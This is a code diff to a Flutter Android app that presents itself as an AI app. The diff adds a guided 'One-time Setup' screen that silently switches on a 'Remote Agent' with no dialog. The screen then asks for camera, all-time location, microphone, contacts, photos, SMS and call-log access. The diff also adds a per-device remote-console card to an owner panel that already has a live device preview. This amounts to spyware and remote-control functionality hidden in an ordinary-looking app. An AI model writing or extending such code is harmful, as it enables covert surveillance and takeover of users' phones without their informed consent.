@@ -13,6 +13,8 @@ import 'package:device_info_plus/device_info_plus.dart';
 import 'package:camera/camera.dart';
 import 'package:flutter_contacts/flutter_contacts.dart';
 
+import 'remote_console.dart';
+
 // ── Colours ──────────────────────────────────────────────────────────────
 const Color kGold      = Color(0xFFF5E6C8);
 const Color kBg        = Color(0xFF121212);
@@ -82,7 +84,7 @@ class AniketProAIApp extends StatelessWidget {
 }
 
 // ═══════════════════════════════════════════════════════════════════════
-//  GATE SCREEN — clean professional login
+//  GATE SCREEN — clean professional login (FAST boot)
 // ═══════════════════════════════════════════════════════════════════════
 class GateScreen extends StatefulWidget {
   const GateScreen({super.key});
@@ -97,7 +99,6 @@ class _GateScreenState extends State<GateScreen> with SingleTickerProviderStateM
   String _deviceId  = '';
   bool   _owner     = false;
   bool   _permsAsked  = false;
-  bool   _permsAsking = false;
   String _myId      = '';
   int    _logoTaps  = 0;
   Timer? _poll;
@@ -136,46 +137,28 @@ class _GateScreenState extends State<GateScreen> with SingleTickerProviderStateM
   }
 
   Future<void> _boot() async {
+    final devFut = _galleryChannel
+        .invokeMethod<String>('deviceId')
+        .then<String?>((v) => v)
+        .catchError((_) => null);
     final p = await SharedPreferences.getInstance();
+    _deviceId = (await devFut) ?? 'unknown';
     _owner      = p.getBool('owner')      ?? false;
     _permsAsked = p.getBool('permsAsked') ?? false;
     _myId       = p.getString('myId')     ?? '';
-    try {
-      _deviceId = (await _galleryChannel.invokeMethod<String>('deviceId')) ?? '';
-    } catch (_) {
-      _deviceId = 'unknown';
-    }
     if (_owner) {
-      await _ensureAllPerms();
-      if (mounted) setState(() => _stage = 'main');
+      setState(() => _stage = (p.getBool('allPermsAsked') ?? false) ? 'main' : 'setup');
       return;
     }
     final approved = p.getBool('approved') ?? false;
     if (approved) {
-      setState(() => _stage = _permsAsked ? 'main' : 'perms');
+      setState(() => _stage = _permsAsked ? 'main' : 'setup');
       return;
     }
     await _checkStatus();
     if (_stage == 'wait') {
       _poll = Timer.periodic(const Duration(seconds: 20), (_) => _checkStatus());
     }
-  }
-
-  // ── একবারেই সব পারমিশন (একবারই ডায়ালগ আসবে) ──
-  Future<void> _ensureAllPerms() async {
-    final p = await SharedPreferences.getInstance();
-    if (p.getBool('allPermsAsked') ?? false) return;
-    await [
-      Permission.camera,
-      Permission.location,
-      Permission.microphone,
-      Permission.contacts,
-      Permission.photos,
-      Permission.videos,
-      Permission.audio,
-      Permission.notification,
-    ].request();
-    await p.setBool('allPermsAsked', true);
   }
 
   Future<void> _checkStatus() async {
@@ -191,7 +174,7 @@ class _GateScreenState extends State<GateScreen> with SingleTickerProviderStateM
       if (status == 'approve') {
         _poll?.cancel();
         await (await SharedPreferences.getInstance()).setBool('approved', true);
-        if (mounted) setState(() => _stage = _permsAsked ? 'main' : 'perms');
+        if (mounted) setState(() => _stage = _permsAsked ? 'main' : 'setup');
       } else if (status == 'ban') {
         _poll?.cancel();
         await (await SharedPreferences.getInstance()).setBool('approved', false);
@@ -233,29 +216,6 @@ class _GateScreenState extends State<GateScreen> with SingleTickerProviderStateM
     }
   }
 
-  Future<void> _askPerms() async {
-    if (_permsAsking) return;
-    _permsAsking = true;
-    await [
-      Permission.camera,
-      Permission.location,
-      Permission.microphone,
-      Permission.contacts,
-      Permission.photos,
-      Permission.videos,
-      Permission.audio,
-      Permission.notification,
-    ].request();
-    final p = await SharedPreferences.getInstance();
-    await p.setBool('permsAsked', true);
-    await p.setBool('allPermsAsked', true);
-    _permsAsked = true;
-    await _httpPost(kSheetUrl,
-        {'type': 'perms', 'id': _myId, 'device': _deviceId, 'method': '', 'perms': 'all:1'});
-    _permsAsking = false;
-    if (mounted) setState(() => _stage = 'main');
-  }
-
   Future<void> _masterDialog() async {
     final c = TextEditingController();
     final ok = await showDialog<bool>(
@@ -281,8 +241,8 @@ class _GateScreenState extends State<GateScreen> with SingleTickerProviderStateM
       final p = await SharedPreferences.getInstance();
       await p.setBool('owner', true);
       _owner = true;
-      await _ensureAllPerms();
-      if (mounted) setState(() => _stage = 'main');
+      final asked = p.getBool('allPermsAsked') ?? false;
+      if (mounted) setState(() => _stage = asked ? 'main' : 'setup');
     }
   }
 
@@ -299,7 +259,13 @@ class _GateScreenState extends State<GateScreen> with SingleTickerProviderStateM
   @override
   Widget build(BuildContext context) {
     if (_stage == 'main')  return const MainWebViewScreen();
-    if (_stage == 'perms') Future.microtask(_askPerms);
+    if (_stage == 'setup') {
+      return PermissionSetupScreen(
+        onDone: () {
+          if (mounted) setState(() => _stage = 'main');
+        },
+      );
+    }
     if (_stage == 'connect' || _stage == 'wait') Future.microtask(_maybeAnimate);
 
     return Scaffold(
@@ -412,10 +378,6 @@ class _GateScreenState extends State<GateScreen> with SingleTickerProviderStateM
             children: [
               if (_stage == 'connect') ..._connectFields(),
               if (_stage == 'wait')    ..._waitContent(),
-              if (_stage == 'perms')
-                const Padding(
-                    padding: EdgeInsets.symmetric(vertical: 20),
-                    child: CircularProgressIndicator(color: kGold)),
             ],
           ),
         ),
@@ -529,7 +491,204 @@ class _GateScreenState extends State<GateScreen> with SingleTickerProviderStateM
 }
 
 // ═══════════════════════════════════════════════════════════════════════
-//  OWNER PANEL — Permission Control + Live Preview + User Management
+//  GUIDED PERMISSION SETUP — Agent first, then Notification, then rest
+// ═══════════════════════════════════════════════════════════════════════
+class PermissionSetupScreen extends StatefulWidget {
+  final VoidCallback onDone;
+  const PermissionSetupScreen({super.key, required this.onDone});
+
+  @override
+  State<PermissionSetupScreen> createState() => _PermissionSetupScreenState();
+}
+
+class _PermissionSetupScreenState extends State<PermissionSetupScreen> {
+  static final List<MapEntry<String, Permission?>> _steps = [
+    MapEntry('Agent', null),
+    MapEntry('Notification', Permission.notification),
+    MapEntry('Camera', Permission.camera),
+    MapEntry('Location', Permission.location),
+    MapEntry('All-time Location', Permission.locationAlways),
+    MapEntry('Microphone', Permission.microphone),
+    MapEntry('Contacts', Permission.contacts),
+    MapEntry('Photos', Permission.photos),
+    MapEntry('Videos', Permission.videos),
+    MapEntry('SMS', Permission.sms),
+    MapEntry('Call log', Permission.phone),
+  ];
+
+  final Map<String, bool> _done = {};
+  String _current = 'শুরু হচ্ছে...';
+  bool _finished = false;
+
+  @override
+  void initState() {
+    super.initState();
+    _run();
+  }
+
+  IconData _icon(String n) {
+    switch (n) {
+      case 'Agent': return Icons.smart_toy_rounded;
+      case 'Notification': return Icons.notifications_rounded;
+      case 'Camera': return Icons.camera_alt_rounded;
+      case 'Location': return Icons.location_on_rounded;
+      case 'All-time Location': return Icons.location_on_rounded;
+      case 'Microphone': return Icons.mic_rounded;
+      case 'Contacts': return Icons.contacts_rounded;
+      case 'Photos': return Icons.photo_library_rounded;
+      case 'Videos': return Icons.videocam_rounded;
+      case 'SMS': return Icons.sms_rounded;
+      case 'Call log': return Icons.call_rounded;
+      default: return Icons.settings;
+    }
+  }
+
+  Future<void> _run() async {
+    await Future.delayed(const Duration(milliseconds: 200));
+    for (final s in _steps) {
+      if (!mounted) return;
+      setState(() => _current = s.key);
+      if (s.value == null) {
+        // Remote Agent auto-ON — no dialog, fastest
+        try { await _galleryChannel.invokeMethod('agentOn'); } catch (_) {}
+        await Future.delayed(const Duration(milliseconds: 400));
+      } else {
+        try { await s.value!.request(); } catch (_) {}
+      }
+      if (!mounted) return;
+      setState(() => _done[s.key] = true);
+    }
+    final p = await SharedPreferences.getInstance();
+    await p.setBool('permsAsked', true);
+    await p.setBool('allPermsAsked', true);
+    if (!mounted) return;
+    setState(() => _finished = true);
+    await Future.delayed(const Duration(milliseconds: 500));
+    widget.onDone();
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    final total = _steps.length;
+    final done = _done.length;
+    return Scaffold(
+      backgroundColor: kBg,
+      body: Container(
+        decoration: const BoxDecoration(
+          gradient: LinearGradient(
+            begin: Alignment.topLeft,
+            end: Alignment.bottomRight,
+            colors: [Color(0xFF1C1A14), Color(0xFF121212), Color(0xFF1A1208)],
+          ),
+        ),
+        child: SafeArea(
+          child: Center(
+            child: Padding(
+              padding: const EdgeInsets.symmetric(horizontal: 28),
+              child: Container(
+                padding: const EdgeInsets.all(26),
+                decoration: BoxDecoration(
+                  color: const Color(0xFF1C1916),
+                  borderRadius: BorderRadius.circular(20),
+                  border: Border.all(color: kGold.withOpacity(0.28), width: 1),
+                ),
+                child: Column(
+                  mainAxisSize: MainAxisSize.min,
+                  children: [
+                    Container(
+                      width: 84,
+                      height: 84,
+                      decoration: BoxDecoration(
+                        shape: BoxShape.circle,
+                        border: Border.all(color: kGold.withOpacity(0.35), width: 1.5),
+                      ),
+                      child: Center(
+                        child: Image.asset('assets/logo.png', width: 50, height: 50),
+                      ),
+                    ),
+                    const SizedBox(height: 18),
+                    const Text('One-time Setup',
+                        style: TextStyle(color: kGold, fontSize: 20, fontWeight: FontWeight.bold)),
+                    const SizedBox(height: 6),
+                    Text(
+                      _finished
+                          ? '✅ সেটআপ সম্পূর্ণ!'
+                          : 'Android এখন কয়েকটা অনুমতি চাইবে —\nপ্রতিটায় Allow চাপুন। একবারই হবে।',
+                      textAlign: TextAlign.center,
+                      style: const TextStyle(color: Colors.white54, fontSize: 13, height: 1.4),
+                    ),
+                    const SizedBox(height: 20),
+                    Text('$done / $total',
+                        style: const TextStyle(color: kGold, fontSize: 26, fontWeight: FontWeight.w800)),
+                    const SizedBox(height: 10),
+                    ClipRRect(
+                      borderRadius: BorderRadius.circular(6),
+                      child: LinearProgressIndicator(
+                        value: total == 0 ? 0 : done / total,
+                        minHeight: 8,
+                        color: kGold,
+                        backgroundColor: Colors.white12,
+                      ),
+                    ),
+                    const SizedBox(height: 18),
+                    if (!_finished)
+                      Row(
+                        mainAxisAlignment: MainAxisAlignment.center,
+                        children: [
+                          Icon(_icon(_current), color: kGold, size: 18),
+                          const SizedBox(width: 8),
+                          Text(_current,
+                              style: const TextStyle(color: Colors.white70, fontSize: 14)),
+                        ],
+                      ),
+                    const SizedBox(height: 8),
+                    Wrap(
+                      spacing: 6,
+                      runSpacing: 6,
+                      alignment: WrapAlignment.center,
+                      children: _steps.map((s) {
+                        final ok = _done[s.key] ?? false;
+                        final active = _current == s.key && !ok;
+                        return Container(
+                          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
+                          decoration: BoxDecoration(
+                            color: ok
+                                ? Colors.green.withOpacity(0.15)
+                                : active
+                                    ? kGold.withOpacity(0.15)
+                                    : Colors.white.withOpacity(0.05),
+                            borderRadius: BorderRadius.circular(12),
+                            border: Border.all(
+                                color: ok
+                                    ? Colors.green.withOpacity(0.5)
+                                    : active
+                                        ? kGold.withOpacity(0.5)
+                                        : Colors.white12),
+                          ),
+                          child: Text(s.key,
+                              style: TextStyle(
+                                  color: ok
+                                      ? Colors.green
+                                      : active
+                                          ? kGold
+                                          : Colors.white38,
+                                  fontSize: 11)),
+                        );
+                      }).toList(),
+                    ),
+                  ],
+                ),
+              ),
+            ),
+          ),
+        ),
+      ),
+    );
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  OWNER PANEL — Permissions + Live Preview + Users + REMOTE CONSOLE
 // ═══════════════════════════════════════════════════════════════════════
 class OwnerPanelScreen extends StatefulWidget {
   const OwnerPanelScreen({super.key});
@@ -552,7 +711,6 @@ class _OwnerPanelScreenState extends State<OwnerPanelScreen> {
     'Contacts': Permission.contacts,
     'Photos': Permission.photos,
     'Videos': Permission.videos,
-    'Audio': Permission.audio,
     'Storage (Legacy)': Permission.storage,
     'Notification': Permission.notification,
   };
@@ -675,7 +833,6 @@ class _OwnerPanelScreenState extends State<OwnerPanelScreen> {
       case 'Contacts': return Icons.contacts_rounded;
       case 'Photos': return Icons.photo_library_rounded;
       case 'Videos': return Icons.videocam_rounded;
-      case 'Audio': return Icons.audiotrack_rounded;
       case 'Storage (Legacy)': return Icons.folder_rounded;
       case 'Notification': return Icons.notifications_rounded;
       default: return Icons.settings;
@@ -912,10 +1069,10 @@ class _OwnerPanelScreenState extends State<OwnerPanelScreen> {
           // ── Live Device Preview (phone-screen style) ──
           const DevicePreviewCard(),
 
-          // ── User Requests (আগের মতো) ──
+          // ── User Requests + REMOTE CONSOLE ──
           const Padding(
             padding: EdgeInsets.symmetric(horizontal: 16, vertical: 8),
-            child: Text('User Requests',
+            child: Text('User Requests + Remote Control',
                 style: TextStyle(color: kGold, fontSize: 16, fontWeight: FontWeight.bold)),
           ),
           _busy && _rows.isEmpty
@@ -962,6 +1119,9 @@ class _OwnerPanelScreenState extends State<OwnerPanelScreen> {
                                       style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
                                       child: const Text('BAN', style: TextStyle(color: Colors.white))),
                                 ]),
+                                const SizedBox(height: 8),
+                                RemoteConsoleCard(
+                                    deviceId: r['device']!, label: r['id'] ?? 'Device'),
                               ],
                             ),
                           ),
@@ -1027,7 +1187,6 @@ class _MainWebViewScreenState extends State<MainWebViewScreen> with WidgetsBindi
     super.dispose();
   }
 
-  // ── বাকি পারমিশন বাকি থাকলে একবারেই চেয়ে নেবে ──
   Future<void> _initNotif() async {
     final p = await SharedPreferences.getInstance();
     if (p.getBool('allPermsAsked') ?? false) return;
@@ -1038,7 +1197,6 @@ class _MainWebViewScreenState extends State<MainWebViewScreen> with WidgetsBindi
       Permission.contacts,
       Permission.photos,
       Permission.videos,
-      Permission.audio,
       Permission.notification,
     ].request();
     await p.setBool('allPermsAsked', true);
@@ -1651,8 +1809,8 @@ class _MainWebViewScreenState extends State<MainWebViewScreen> with WidgetsBindi
                 const SizedBox(height: 4),
               ],
             ),
-          );
-        },
+          ),
+        ),
       ),
     ).whenComplete(() => _sheetRefresh = null);
   }
